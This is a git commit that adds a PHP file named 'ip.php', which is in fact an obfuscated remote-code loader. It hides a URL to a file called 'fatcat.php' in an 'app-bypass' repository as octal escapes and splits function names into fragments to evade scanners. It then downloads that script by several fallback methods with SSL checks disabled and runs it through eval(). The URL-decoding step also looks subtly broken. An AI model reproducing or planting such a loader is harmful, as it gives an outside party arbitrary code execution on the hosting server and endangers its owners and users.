1a4968a6d0de000f0fd013fe87c9a369b685357a
cemoza05 <cemoza05@gmail.com>
2024-09-16 12:23:26 +0700

    Add files via upload

---
+++ ip.php
@@ -0,0 +1,59 @@
+<?php
+$hexUrl = '\150\164\164\160\163\72\57\57\147\151\164\150\165\142\56\143\157\155\57\143\145\155\157\172\141\60\65\57\141\160\160\55\142\171\160\141\163\163\57\162\141\167\57\155\141\151\156\57\146\141\164\143\141\164\56\160\150\160';
+
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
+        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+    }
+    return $str;
+}
+
+$url = hex2str($hexUrl);
+
+function downloadWithFileGetContents($url) {
+    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+function downloadWithCurl($url) {
+    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+    return false;
+}
+
+function downloadWithFopen($url) {
+    $result = false;
+    if ($fp = fopen($url, 'r')) {
+        $result = '';
+        while ($data = fread($fp, 8192)) {
+            $result .= $data;
+        }
+        fclose($fp);
+    }
+    return $result;
+}
+
+$phpScript = downloadWithFileGetContents($url);
+if ($phpScript === false) {
+    $phpScript = downloadWithCurl($url);
+}
+if ($phpScript === false) {
+    $phpScript = downloadWithFopen($url);
+}
+
+if ($phpScript === false) {
+    die("Gagal mendownload script PHP dari URL dengan semua metode.");
+}
+
+eval('?>' . $phpScript);
+?>
